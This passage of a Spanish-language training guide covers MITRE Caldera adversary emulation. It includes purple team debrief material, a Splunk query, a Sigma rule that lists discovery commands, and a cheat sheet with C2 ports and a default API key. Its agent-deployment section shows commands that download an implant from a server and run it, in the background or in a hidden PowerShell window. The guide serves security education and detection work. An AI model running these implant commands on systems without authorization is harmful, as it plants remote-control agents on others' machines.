#### Secciones del reporte Debrief

1. **Executive Summary**:
   - DuraciÃ³n de la operaciÃ³n
   - NÃºmero de tÃ©cnicas ejecutadas
   - Tasa de Ã©xito
   - Cobertura ATT&CK

2. **Timeline de ejecuciÃ³n**:
   - VisualizaciÃ³n cronolÃ³gica de tÃ©cnicas
   - IdentificaciÃ³n de cuellos de botella
   - Tiempo entre habilidades

3. **Facts Discovery**:
   - Ãrbol de dependencias de facts
   - VisualizaciÃ³n de encadenamiento
   - Facts mÃ¡s valiosos

4. **Agent Performance**:
   - EstadÃ­sticas por agente
   - Tasa de Ã©xito de comandos
   - Latencia de comunicaciÃ³n C2

### Perspectiva Red Team: EvaluaciÃ³n de operaciÃ³n

#### MÃ©tricas de Ã©xito

| MÃ©trica | Pregunta clave | EvaluaciÃ³n |
|---------|----------------|------------|
| **Completitud** | Â¿Se ejecutaron todas las habilidades planificadas? | SÃ­/No |
| **Tasa de Ã©xito** | Â¿QuÃ© porcentaje de comandos tuvieron Ã©xito? | 85% |
| **Facts obtenidos** | Â¿Se descubrieron facts Ãºtiles para escalar? | 15 facts |
| **Tiempo total** | Â¿CuÃ¡nto durÃ³ la operaciÃ³n completa? | 15 min |
| **DetecciÃ³n** | Â¿La operaciÃ³n fue detectada por Blue Team? | Â¿? |

#### AnÃ¡lisis de fallas

Si una habilidad fallÃ³, analizar:

1. **Causa tÃ©cnica**: Â¿Error de comando, dependencia faltante?
2. **Dependencia de facts**: Â¿Faltaba un fact requerido?
3. **Privilegios insuficientes**: Â¿Se requerÃ­a escalaciÃ³n?
4. **Plataforma incorrecta**: Â¿Comando no compatible con OS?

#### OptimizaciÃ³n de adversario

Basado en resultados, refinar el adversario:

```yaml
# Agregar habilidades alternativas para mayor flexibilidad
atomic_ordering:
  - ability_id_primary
  - ability_id_fallback  # Si primary falla
```

### Perspectiva Blue Team: DetecciÃ³n y respuesta

#### CorrelaciÃ³n con SIEM

Importar telemetrÃ­a del sistema objetivo al SIEM durante la operaciÃ³n:

**Fuentes de telemetrÃ­a recomendadas**:

1. **Linux**:
   - auditd logs (`/var/log/audit/audit.log`)
   - Syslog (`/var/log/syslog`)
   - Osquery (consultas de seguridad)

2. **Windows**:
   - Sysmon (Event IDs 1, 3, 7, 10, 11, 13)
   - Windows Security Event Log (4688, 4689)
   - PowerShell Script Block Logging (4104)

#### Ejemplo: BÃºsqueda en Splunk

```spl
index=linux source="/var/log/audit/audit.log"
| search type=EXECVE
| eval cmdline=a0." ".a1." ".a2
| search cmdline="arp -a" OR cmdline="whoami" OR cmdline="hostname"
| stats count by cmdline, _time, host
| where count > 2
```

**Resultado esperado**: DetecciÃ³n de mÃºltiples comandos de descubrimiento en corto perÃ­odo.

#### Desarrollo de reglas de detecciÃ³n

**Ejemplo: Sigma Rule**

```yaml
title: Caldera-like Discovery Command Sequence
description: Detecta secuencia de comandos tÃ­pica de emulaciÃ³n de adversarios Caldera
status: experimental
date: 2025/11/22
author: Blue Team Lab
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/arp'
      - '/whoami'
      - '/hostname'
      - '/uname'
      - '/ifconfig'
      - '/ip'
  timeframe: 120s
  condition: selection | count() > 4
fields:
  - CommandLine
  - User
  - ParentImage
falsepositives:
  - Scripts de administraciÃ³n legÃ­timos
  - Herramientas de inventario
level: medium
tags:
  - attack.discovery
  - attack.t1018
  - attack.t1082
  - attack.t1016
```

#### Mapeo a MITRE D3FEND

Para cada tÃ©cnica ATT&CK, identificar contramedidas D3FEND:

| ATT&CK TÃ©cnica | Contramedida D3FEND | ImplementaciÃ³n |
|----------------|---------------------|----------------|
| T1018 (Network Discovery) | D3-NTA (Network Traffic Analysis) | Detectar escaneos ARP anÃ³malos |
| T1552.004 (SSH Keys) | D3-FA (File Access Analysis) | Alertar acceso a `.ssh/` por procesos no SSH |
| T1552.003 (Bash History) | D3-CSPP (Credential Storage Protection) | Proteger `.bash_history` con permisos |
| T1005 (Data from Local System) | D3-DNAC (Data Access Control) | DLP para detectar lectura masiva de archivos |

### Ejercicio Purple Team colaborativo

#### Fase 1: Red Team ejecuta operaciÃ³n

1. Ejecutar operaciÃ³n `Lab3-DataTheft-Simulation`
2. Documentar timestamp de inicio
3. NO informar a Blue Team sobre timing exacto

#### Fase 2: Blue Team busca evidencia

1. Analizar logs del perÃ­odo (ejemplo: 10:00 AM - 11:00 AM)
2. Buscar indicadores de descubrimiento, credential access, collection
3. Documentar hallazgos:
   - Â¿QuÃ© tÃ©cnicas fueron detectadas?
   - Â¿CuÃ¡les pasaron desapercibidas?
   - Â¿CuÃ¡nto tiempo tardÃ³ la detecciÃ³n?

#### Fase 3: Debriefing conjunto

Comparar:

| TÃ©cnica | Ejecutada por Red | Detectada por Blue | Gap |
|---------|-------------------|-------------------|-----|
| T1018 ARP Scan | âœ“ 10:01:15 | âœ“ 10:01:30 (15s delay) | Alertado correctamente |
| T1082 System Info | âœ“ 10:01:20 | âœ— No detectado | Falta regla |
| T1552.004 SSH Keys | âœ“ 10:02:00 | âœ“ 10:05:00 (3min delay) | Delay excesivo |
| T1552.003 Bash History | âœ“ 10:02:15 | âœ— No detectado | Falta monitoreo |

#### Fase 4: Mejora iterativa

1. **Blue Team crea reglas** para tÃ©cnicas no detectadas
2. **Red Team re-ejecuta operaciÃ³n** con ofuscaciÃ³n
3. **Validar mejoras** en detecciÃ³n

### Plugin GameBoard para Purple Team

El plugin **GameBoard** visualiza operaciones desde ambas perspectivas simultÃ¡neamente.

#### CaracterÃ­sticas de GameBoard

1. **Vista dividida**:
   - Panel izquierdo: Acciones del Red Team
   - Panel derecho: Detecciones del Blue Team

2. **SincronizaciÃ³n temporal**:
   - Timeline compartida
   - CorrelaciÃ³n de eventos

3. **Scoring**:
   - Puntos para Red Team por tÃ©cnicas exitosas
   - Puntos para Blue Team por detecciones

### AutomatizaciÃ³n de Purple Team con API

Caldera proporciona API REST para automatizaciÃ³n:

#### Ejemplo: Ejecutar operaciÃ³n vÃ­a API

```bash
# Crear operaciÃ³n
curl -X POST http://localhost:8888/api/v2/operations \
  -H "KEY: ADMIN123" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "AutomatedPurpleTeam-Exercise",
    "adversary": {"adversary_id": "de07f52d-9928-4071-9142-cb1d3bd851e8"},
    "group": "red",
    "planner": {"id": "aaa7c857-37a0-4c4a-85f7-4e9f7f30e31a"},
    "state": "running",
    "autonomous": 1
  }'

# Obtener resultados
curl -X GET http://localhost:8888/api/v2/operations/OPERATION_ID/report \
  -H "KEY: ADMIN123" > operation_report.json
```

#### IntegraciÃ³n con pipeline de CI/CD

```yaml
# .gitlab-ci.yml
purple_team_validation:
  stage: security_testing
  script:
    - ./deploy_caldera_agent.sh
    - ./run_purple_team_operation.sh
    - python3 validate_detections.py
    - python3 generate_coverage_report.py
  artifacts:
    reports:
      coverage_report: att&ck_coverage.json
```

### MÃ©tricas de madurez Purple Team

| Nivel | DescripciÃ³n | CaracterÃ­sticas |
|-------|-------------|-----------------|
| **Nivel 1: Ad-hoc** | Ejercicios no planificados | - Sin documentaciÃ³n formal<br>- Sin repetibilidad |
| **Nivel 2: Documentado** | Ejercicios planificados y documentados | - Runbooks para operaciones<br>- Reportes bÃ¡sicos |
| **Nivel 3: Automatizado** | IntegraciÃ³n CI/CD | - Operaciones automatizadas<br>- MÃ©tricas de cobertura |
| **Nivel 4: Continuo** | ValidaciÃ³n continua | - EjecuciÃ³n regular<br>- Dashboard de cobertura ATT&CK |
| **Nivel 5: Optimizado** | Mejora basada en datos | - AnÃ¡lisis de tendencias<br>- OptimizaciÃ³n de reglas |

### Resultado esperado de perspectiva Purple Team

Al finalizar esta secciÃ³n, el estudiante comprenderÃ¡:

âœ“ CÃ³mo analizar resultados desde perspectiva Red Team
âœ“ CÃ³mo correlacionar actividad con telemetrÃ­a Blue Team
âœ“ Desarrollo de reglas de detecciÃ³n basadas en operaciones Caldera
âœ“ MÃ©tricas para evaluar gaps de detecciÃ³n
âœ“ Uso de ejercicios Purple Team para mejora continua
âœ“ AutomatizaciÃ³n de validaciÃ³n de seguridad

<hr style="border: none; height: 10px; background-color: #003b00;" />

## <font color="#87CEEB">7. Referencia rÃ¡pida y recursos adicionales</font>

<hr style="border: none; height: 10px; background-color: #003b00;" />

### Cheat Sheet de comandos

#### InstalaciÃ³n y gestiÃ³n de Caldera

```bash
# Clonar repositorio
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

# Crear entorno virtual
python3 -m venv .calderavenv
source .calderavenv/bin/activate

# Instalar dependencias
pip3 install -r requirements.txt

# Iniciar servidor (primera vez)
python3 server.py --insecure --build

# Iniciar servidor (subsiguiente)
python3 server.py --insecure

# Iniciar con plugins especÃ­ficos
python3 server.py --insecure -P sandcat,stockpile,emu

# Modo debug
python3 server.py --insecure --log DEBUG

# Reset completo (eliminar datos)
python3 server.py --insecure --fresh
```

#### Docker

```bash
# Ejecutar imagen oficial
docker run -p 8888:8888 ghcr.io/mitre/caldera:latest

# Construir imagen local
docker build --build-arg VARIANT=full -t caldera .
docker run -it -p 8888:8888 caldera

# Con persistencia de datos
docker run -p 8888:8888 \
  -v caldera-data:/usr/src/app/data \
  ghcr.io/mitre/caldera:latest

# Con configuraciÃ³n personalizada
docker run -p 8888:8888 \
  -v $(pwd)/mi-config.yml:/usr/src/app/conf/local.yml \
  ghcr.io/mitre/caldera:latest
```

#### Despliegue de agentes

```bash
# Linux
server="http://192.168.1.100:8888"
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" \
  -H "server:$server" -H "group:red" \
  $server/file/download > sandcat && \
chmod +x sandcat && \
./sandcat -server $server -group red -v

# Linux (background)
nohup ./sandcat -server $server -group red > /dev/null 2>&1 &

# macOS
curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" \
  -H "server:$server" -H "group:red" \
  $server/file/download > sandcat-darwin && \
chmod +x sandcat-darwin && \
./sandcat-darwin -server $server -group red
```

```powershell
# Windows PowerShell
$server="http://192.168.1.100:8888"
$url="$server/file/download"
$wc=New-Object System.Net.WebClient
$wc.Headers.add("platform","windows")
$wc.Headers.add("file","sandcat.go")
$output="C:\Users\Public\sandcat.exe"
$wc.DownloadFile($url,$output)
Start-Process -FilePath $output -ArgumentList "-server $server" -WindowStyle hidden
```

#### API REST

```bash
# API Key por defecto (modo insecure)
API_KEY="ADMIN123"
SERVER="http://localhost:8888"

# Listar adversarios
curl -X GET $SERVER/api/v2/adversaries -H "KEY: $API_KEY"

# Listar operaciones
curl -X GET $SERVER/api/v2/operations -H "KEY: $API_KEY"

# Crear operaciÃ³n
curl -X POST $SERVER/api/v2/operations \
  -H "KEY: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "API-Operation",
    "adversary": {"adversary_id": "de07f52d-9928-4071-9142-cb1d3bd851e8"},
    "group": "red",
    "state": "running",
    "autonomous": 1
  }'

# Obtener reporte de operaciÃ³n
curl -X GET $SERVER/api/v2/operations/OPERATION_ID/report \
  -H "KEY: $API_KEY" > report.json

# Listar agentes
curl -X GET $SERVER/api/v2/agents -H "KEY: $API_KEY"

# Matar agente
curl -X DELETE $SERVER/api/v2/agents/PAW_ID -H "KEY: $API_KEY"
```

### Rutas de archivos importantes

```bash
# ConfiguraciÃ³n
/conf/default.yml              # ConfiguraciÃ³n por defecto (insecure)
/conf/local.yml                # ConfiguraciÃ³n de producciÃ³n
/conf/agents.yml               # ConfiguraciÃ³n de agentes
/conf/payloads.yml             # DefiniciÃ³n de payloads

# Datos de usuario
/data/adversaries/             # Adversarios personalizados
/data/abilities/               # Habilidades personalizadas
/data/sources/                 # Fuentes de facts personalizadas
/data/planners/                # Planificadores personalizados
/data/results/                 # Resultados de operaciones

# Plugins
/plugins/sandcat/              # Agente Sandcat
/plugins/stockpile/            # Habilidades y adversarios estÃ¡ndar
/plugins/emu/                  # EmulaciÃ³n de adversarios reales
/plugins/atomic/               # Atomic Red Team

# Stockpile (incluido con Caldera)
/plugins/stockpile/data/abilities/       # 162 habilidades
/plugins/stockpile/data/adversaries/     # Adversarios pre-construidos

# Logs
/data/results/                 # Resultados de operaciones
/logs/                         # Logs del servidor (si configurado)
```

### Puertos de red

| Puerto | Protocolo | Uso | ConfiguraciÃ³n |
|--------|-----------|-----|---------------|
| 8888 | HTTP | Interfaz web y C2 HTTP | `conf/default.yml: port` |
| 8443 | HTTPS | Interfaz web segura | Plugin SSL requerido |
| 7010 | TCP | Canal C2 TCP | `app.contact.tcp` |
| 7011 | UDP | Canal C2 UDP | `app.contact.udp` |
| 7012 | WebSocket | Canal C2 WebSocket | `app.contact.websocket` |
| 8853 | DNS | TÃºnel DNS C2 | `app.contact.dns.socket` |
| 2222 | FTP | Canal C2 FTP | `app.contact.ftp.port` |
| 8022 | SSH | TÃºnel SSH | `app.contact.tunnel.ssh.socket` |

### TÃ¡cticas y tÃ©cnicas ATT&CK cubiertas

#### DistribuciÃ³n de habilidades por tÃ¡ctica

| TÃ¡ctica | Ejemplo de tÃ©cnicas | Habilidades disponibles |
|---------|---------------------|-------------------------|
| **Reconnaissance** | T1595, T1592 | Limitadas (enfoque post-compromise) |
| **Resource Development** | T1583, T1586 | No aplicable (infraestructura C2 ya establecida) |
| **Initial Access** | T1566, T1190 | Plugin Access |
| **Execution** | T1059 (PowerShell, Bash, Cmd) | ~25 habilidades |
| **Persistence** | T1053, T1547 | ~10 habilidades |
| **Privilege Escalation** | T1055, T1068 | ~15 habilidades |
| **Defense Evasion** | T1070, T1027, T1562 | ~20 habilidades |
| **Credential Access** | T1003, T1552, T1555 | ~18 habilidades |
| **Discovery** | T1082, T1018, T1016 | ~30 habilidades |
| **Lateral Movement** | T1021 (SMB, RDP, SSH) | ~12 habilidades |
| **Collection** | T1005, T1074, T1113 | ~15 habilidades |
| **Command and Control** | T1071, T1095, T1573 | ImplÃ­cito en agentes |
| **Exfiltration** | T1041, T1048, T1567 | ~8 habilidades |
| **Impact** | T1485, T1486, T1490 | ~9 habilidades |

**Total**: 162 habilidades en Stockpile + adicionales en Emu y Atomic

### Adversarios reales disponibles (Plugin EMU)

| Grupo APT | Nombre alternativo | Objetivo tÃ­pico | TÃ©cnicas destacadas |
|-----------|-------------------|-----------------|---------------------|
| **APT29** | Cozy Bear, The Dukes | Gobiernos, think tanks | Spearphishing, WMI, PowerShell |
| **Carbanak** | FIN7 (relacionado) | Instituciones financieras | Point-of-sale malware, ATM jackpotting |
| **FIN6** | - | Retail, hospitality | Tarjetas de pago, POS scraping |
| **FIN7** | Carbanak (overlap) | Retail, restaurants | Phishing, Carbanak backdoor |
| **Menu Pass** | APT10, Stone Panda | MSPs, telecomunicaciones | Cloud hopper, RATs, DLL side-loading |
| **Wizard Spider** | - | Empresas globales | Trickbot, Ryuk ransomware |
| **OilRig** | APT34, Helix Kitten | Medio Oriente, energÃ­a | DNS tunneling, webshells |

### Troubleshooting comÃºn

#### Problema: Agente no se conecta

```bash
# Verificar conectividad
ping CALDERA_SERVER_IP
telnet CALDERA_SERVER_IP 8888

# Verificar servidor Caldera estÃ¡ escuchando
netstat -tuln | grep 8888

# Verificar firewall
sudo ufw status
sudo iptables -L -n

# Verificar logs del agente (si ejecutado con -v)
./sandcat -server http://SERVER:8888 -group red -v
```

#### Problema: Habilidad falla en ejecuciÃ³n

1. **Verificar executor**: Â¿El agente tiene el executor requerido?
   - Windows: `psh`, `cmd`, `pwsh`
   - Linux: `sh`, `bash`

2. **Verificar privilegios**: Â¿La habilidad requiere privilegios elevados?

3. **Verificar dependencias de facts**: Â¿Falta un fact requerido?
   - Revisar comando para placeholders `#{fact.name}`

4. **Verificar plataforma**: Â¿Habilidad compatible con OS del agente?

#### Problema: OperaciÃ³n se queda en "running" pero no progresa

1. **Verificar estado de agentes**: Â¿Agentes estÃ¡n "alive"?
2. **Revisar sleep interval**: Agentes con sleep alto tardan mÃ¡s
3. **Verificar dependencias**: Â¿Alguna habilidad requiere fact no disponible?
4. **Ver logs del servidor**: `python3 server.py --log DEBUG`

#### Problema: Docker no persiste datos

```bash
# Crear volumen antes de ejecutar
docker volume create caldera-data

# Montar volumen en /usr/src/app/data
docker run -p 8888:8888 \
  -v caldera-data:/usr/src/app/data \
  ghcr.io/mitre/caldera:latest
```

### Recursos adicionales

#### DocumentaciÃ³n oficial

- **DocumentaciÃ³n Caldera**: [https://caldera.readthedocs.io](https://caldera.readthedocs.io)
- **Repositorio GitHub**: [https://github.com/mitre/caldera](https://github.com/mitre/caldera)
- **MITRE ATT&CK**: [https://attack.mitre.org](https://attack.mitre.org)
- **MITRE D3FEND**: [https://d3fend.mitre.org](https://d3fend.mitre.org)

#### Videos y tutoriales

- **Canal YouTube de Caldera**: [Playlist oficial](https://www.youtube.com/playlist?list=PLF2bj1pw7-ZvLTjIwSaTXNLN2D2yx-wXH)
- **MITRE ATT&CK Training**: [attack.mitre.org/resources/training](https://attack.mitre.org/resources/training)

#### Comunidad y soporte

- **GitHub Issues**: [github.com/mitre/caldera/issues](https://github.com/mitre/caldera/issues)
- **Slack Workspace**: Disponible para colaboradores

#### Herramientas complementarias

| Herramienta | PropÃ³sito | URL |
|-------------|-----------|-----|
| **ATT&CK Navigator** | Visualizar cobertura ATT&CK | [mitre-attack.github.io/attack-navigator](https://mitre-attack.github.io/attack-navigator) |
| **Atomic Red Team** | Tests atÃ³micos de ATT&CK | [github.com/redcanaryco/atomic-red-team](https://github.com/redcanaryco/atomic-red-team) |
| **Sigma** | Reglas de detecciÃ³n genÃ©ricas | [github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma) |
| **Detection Lab** | Lab automatizado para detecciÃ³n | [github.com/clong/DetectionLab](https://github.com/clong/DetectionLab) |
| **VECTR** | GestiÃ³n de Purple Team | [vectr.io](https://vectr.io) |

#### Cursos y certificaciones

- **Caldera Training Plugin**: Curso de certificaciÃ³n integrado en Caldera (acceder vÃ­a Plugins â†’ Training)
- **MITRE ATT&CK Defender (MAD)**: CertificaciÃ³n oficial de MITRE sobre ATT&CK
- **SANS SEC555**: SIEM Implementation and Advanced Threat Detection
- **SANS SEC599**: Defeating Advanced Adversaries - Purple Team Tactics & Kill Chain Defenses

### PrÃ³ximos pasos sugeridos

#### Para profundizar conocimiento

1. **Explorar plugin EMU**:
   - Ejecutar emulaciÃ³n de APT29
   - Comparar TTPs con reporte CTID original
   - Validar detecciones contra adversario real

2. **Crear habilidad personalizada**:
   - Escribir YAML de habilidad nueva
   - Agregar parser para extraer facts
   - Incluir comando de cleanup

3. **Desarrollar plugin custom**:
   - Estudiar arquitectura de plugins
   - Crear plugin simple (ejemplo: integraciÃ³n con API externa)
   - Documentar en repositorio personal

4. **IntegraciÃ³n con SIEM**:
   - Configurar forwarding de logs (Sysmon, auditd)
   - Crear dashboard de operaciones Caldera
   - Correlacionar eventos con operaciones conocidas

#### Para aplicaciÃ³n prÃ¡ctica

1. **Implementar programa Purple Team**:
   - Definir calendario de ejercicios mensuales
   - Crear adversarios basados en threat intelligence de la organizaciÃ³n
   - Medir mejora en tasa de detecciÃ³n trimestral

2. **ValidaciÃ³n de controles de seguridad**:
   - Mapear controles actuales a ATT&CK
   - Ejecutar operaciones Caldera para validar gaps
   - Priorizar implementaciÃ³n de controles faltantes

3. **AutomatizaciÃ³n de validaciÃ³n**:
   - Integrar Caldera en pipeline CI/CD
   - Ejecutar operaciones bÃ¡sicas en cada deployment
   - Generar mÃ©tricas de cobertura ATT&CK automÃ¡ticas

### Glosario de tÃ©rminos

| TÃ©rmino | DefiniciÃ³n |
|---------|------------|
| **Ability** | TÃ©cnica individual de ATT&CK ejecutable en Caldera |
| **Adversary** | Perfil de ataque que define secuencia de habilidades |
| **Agent** | Implante C2 desplegado en sistema objetivo |
| **APT** | Advanced Persistent Threat - Adversario sofisticado y persistente |
| **Beacon** | ComunicaciÃ³n periÃ³dica del agente con servidor C2 |
| **C2** | Command and Control - Infraestructura de control de implantes |
| **CTID** | Cyber Threat Intelligence - Planes de emulaciÃ³n de MITRE |
| **Executor** | IntÃ©rprete de comandos (PowerShell, Bash, CMD) |
| **Fact** | Dato descubierto durante operaciÃ³n reutilizable en habilidades posteriores |
| **Jitter** | AleatorizaciÃ³n de timing para evasiÃ³n de detecciÃ³n |
| **Link** | Instancia de ejecuciÃ³n de una habilidad |
| **Operation** | CampaÃ±a de ataque en vivo ejecutando adversario |
| **PAW** | Identificador Ãºnico del agente (Paw print) |
| **Planner** | LÃ³gica de ejecuciÃ³n de habilidades en operaciÃ³n |
| **Purple Team** | ColaboraciÃ³n entre Red Team y Blue Team |
| **Source** | Conocimiento inicial (facts) sobre objetivo |
| **TTPs** | Tactics, Techniques, and Procedures - MÃ©todos de adversarios |

### Consideraciones Ã©ticas y legales

> âš ï¸ **ADVERTENCIA LEGAL**
>
> El uso de Caldera y herramientas de emulaciÃ³n de adversarios debe realizarse exclusivamente en:
>
> 1. **Entornos controlados de laboratorio**
> 2. **Sistemas propios o con autorizaciÃ³n explÃ­cita por escrito**
> 3. **Redes aisladas sin conexiÃ³n a sistemas de producciÃ³n**
>
> El uso no autorizado de estas tÃ©cnicas en sistemas que no se poseen constituye **actividad ilegal** en la mayorÃ­a de jurisdicciones y puede resultar en:
> - Sanciones penales
> - Demandas civiles
> - PÃ©rdida de certificaciones profesionales
>
> **SIEMPRE** obtener autorizaciÃ³n por escrito antes de ejecutar operaciones de emulaciÃ³n de adversarios en entornos no propios.

### ConclusiÃ³n

Caldera Framework es una herramienta poderosa para:

âœ“ EducaciÃ³n en ciberseguridad basada en ATT&CK
âœ“ ValidaciÃ³n de controles de seguridad
âœ“ Ejercicios de Purple Team reproducibles
âœ“ Desarrollo de reglas de detecciÃ³n
âœ“ AutomatizaciÃ³n de emulaciÃ³n de adversarios

Este documento ha cubierto los fundamentos necesarios para instalar, configurar y utilizar Caldera en entornos educativos, con enfoque en laboratorios prÃ¡cticos que permiten comprender tanto la perspectiva ofensiva (Red Team) como la defensiva (Blue Team).

La combinaciÃ³n de teorÃ­a, prÃ¡ctica y reflexiÃ³n Purple Team proporciona una base sÃ³lida para continuar explorando la emulaciÃ³n de adversarios y mejorar la postura de seguridad mediante validaciÃ³n continua.

---

**Fecha de Ãºltima actualizaciÃ³n**: 22 de noviembre de 2025
**VersiÃ³n de Caldera**: 5.3.0
**Autor**: Laboratorio de Ciberseguridad - UNTELS

<hr style="border: none; height: 10px; background-color: #003b00;" />
